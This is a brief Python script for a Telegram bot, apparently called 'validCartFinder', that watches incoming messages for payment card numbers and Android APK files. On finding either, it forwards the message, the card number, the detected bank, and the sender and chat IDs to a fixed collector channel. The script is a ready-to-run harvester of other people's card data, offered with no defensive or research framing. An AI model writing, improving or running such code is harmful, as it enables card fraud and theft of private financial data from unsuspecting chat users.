from telethon.sync import TelegramClient,functions,events,types
from cardfinder import card_check,bank_check
api_id = #add urs
api_hash = #add urs
client = TelegramClient('validCartFinder',api_id,api_hash)
client.start(bot_token='#add urs')
print(f'Bot Launched on @{client.get_me().username}')
@client.on(events.NewMessage)
async def apk_finder(event):
    cards=card_check(event.raw_text)
    if event.message.media != None and event.message.media.document. mime_type == 'application/vnd.android.package-archive': 
        await client.forward_messages(-1001155896386, event.message)
    elif (cards):
         await client.send_message(-1001155896386, event.raw_text + "\n **************** \n **user id: **" + str(event.sender_id) + "\n **chat id: **" 
         + str(event.chat_id) + "\n **card number: **"  + str(cards) + "\n **bank: **" + bank_check(cards))


client.run_until_disconnected()


